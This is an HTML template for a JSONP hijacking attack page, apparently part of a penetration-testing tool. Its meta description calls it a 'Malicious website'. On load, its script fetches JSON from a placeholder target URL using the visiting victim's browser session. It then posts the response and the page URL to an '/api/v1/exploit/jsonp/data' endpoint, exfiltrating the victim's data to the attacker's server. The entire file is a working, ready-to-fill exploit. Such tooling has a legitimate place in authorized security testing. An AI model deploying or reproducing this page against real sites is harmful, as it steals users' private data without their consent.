<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <meta name='referrer' content='never'>
    <meta name='author' content='jeffzhang'>
    <meta name="description" content="Malicious website">
    <title>Jsonp Hijacking</title></head>
  <body>
    <p>Hello, Pentester!</p>
    <p id='response'></p>
    <script type='text/javascript' src='https://cdn.bootcss.com/jquery/1.9.1/jquery.min.js'></script>
    <script type="text/javascript">function getQueryVariable(variable) {
        let query = window.location.search.substring(1);
        let vars = query.split("&");
        for (let i = 0; i < vars.length; i++) {
          let pair = vars[i].split("=");
          if (pair[0] === variable) {
            return pair[1];
          }
        }
        return (false);
      }
    </script>
    <script type='text/javascript'>$.getJSON('%(target_url)s',
      function(response) {
        $.post('/api/v1/exploit/jsonp/data', {
          d: JSON.stringify(response),
          link: document.URL
        });
        console.log(response);
        if (getQueryVariable("debug") === 'true') {
          document.getElementById("response").innerHTML = JSON.stringify(response);
        }
      });
    </script>
  </body>
</html>
